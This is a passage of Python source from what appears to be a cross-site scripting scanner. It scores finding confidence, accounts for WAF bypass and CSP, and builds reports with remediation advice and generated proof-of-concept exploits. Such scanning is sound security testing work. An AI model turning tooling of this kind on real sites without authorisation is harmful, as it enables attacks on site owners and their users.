        start = max(0, pos - 50)
        end = min(len(html_content), pos + len(payload) + 50)
        return html_content[start:end]
    
    def _calculate_confidence(
        self,
        confirmations: int,
        context: XSSContext,
        waf_detected: bool,
        csp_present: bool,
    ) -> float:
        """Calculate confidence score (0-100)."""
        base_confidence = 50.0
        
        # Confirmations boost (cross-validation)
        base_confidence += min(confirmations * 15, 30)
        
        # Context-based confidence
        high_confidence_contexts = [
            XSSContext.HTML_TEXT,
            XSSContext.JS_BLOCK,
            XSSContext.HTML_ATTRIBUTE,
        ]
        if context in high_confidence_contexts:
            base_confidence += 10
        
        # WAF bypass increases confidence
        if waf_detected:
            base_confidence += 10
        
        # CSP reduces exploitability but not vulnerability
        if csp_present:
            base_confidence -= 5
        
        return min(100, max(0, base_confidence))
    
    def _create_finding(
        self,
        result: XSSResult,
        url: str,
        param: str,
        injection_point: str,
    ) -> Finding:
        """Create Finding object from XSSResult."""
        parsed = urlparse(url)
        host = parsed.netloc
        
        severity = "HIGH"
        cvss = 6.1
        
        # Adjust severity based on context
        if result.context in [XSSContext.JS_BLOCK, XSSContext.HTML_TEXT]:
            severity = "HIGH"
            cvss = 7.1
        elif result.csp_present and not result.csp_bypassed:
            severity = "MEDIUM"
            cvss = 5.4
        
        evidence_list = [
            f"Parameter: {param}",
            f"Context: {result.context.name}",
            f"Payload: {result.payload}",
            f"Confidence: {result.confidence}%",
            f"WAF Detected: {result.waf_detected.value}",
            f"CSP Present: {result.csp_present}",
            f"Cross-Validations: {len(result.evidence)}",
        ]
        
        for ev in result.evidence[:3]:
            evidence_list.append(f"Reflection: {ev.response_snippet[:100]}...")
        
        # Generate POC with exploitation details
        xss_type = "reflected"
        if "stored" in injection_point.lower() or result.context == XSSContext.HTML_TEXT:
            xss_type = "stored" if "stored" in injection_point.lower() else "reflected"

        poc = ExploitationHelper.generate_xss_poc(
            url=url,
            parameter=param,
            payload=result.payload,
            xss_type=xss_type,
            context=result.context.name.lower(),
        )

        return Finding(
            type="xss",
            name=f"Reflected XSS ({result.context.name})",
            severity=severity,
            description=(
                f"Cross-Site Scripting vulnerability found in {injection_point} '{param}'. "
                f"User input is reflected in {result.context.name} context without proper sanitization. "
                f"This allows attackers to execute arbitrary JavaScript in the victim's browser. "
                f"Confidence: {result.confidence}% based on {len(result.evidence)} cross-validations."
            ),
            host=host,
            matched_at=f"{url}?{param}=",
            evidence=evidence_list,
            cvss_score=cvss,
            cwe="CWE-79",
            confidence=result.confidence,
            remediation=(
                "1. Implement context-aware output encoding:\n"
                "   - HTML context: HTML entity encoding\n"
                "   - JavaScript: JavaScript encoding\n"
                "   - URL: URL encoding\n"
                "   - CSS: CSS encoding\n"
                "2. Deploy Content-Security-Policy headers:\n"
                "   - Disable 'unsafe-inline' and 'unsafe-eval'\n"
                "   - Use nonce or hash-based CSP\n"
                "3. Use HTTPOnly and Secure flags on cookies\n"
                "4. Consider using auto-escaping template engines\n"
                "5. Validate and sanitize all user input"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/cross-site-scripting",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            metadata={"poc": poc.to_dict()},
        )
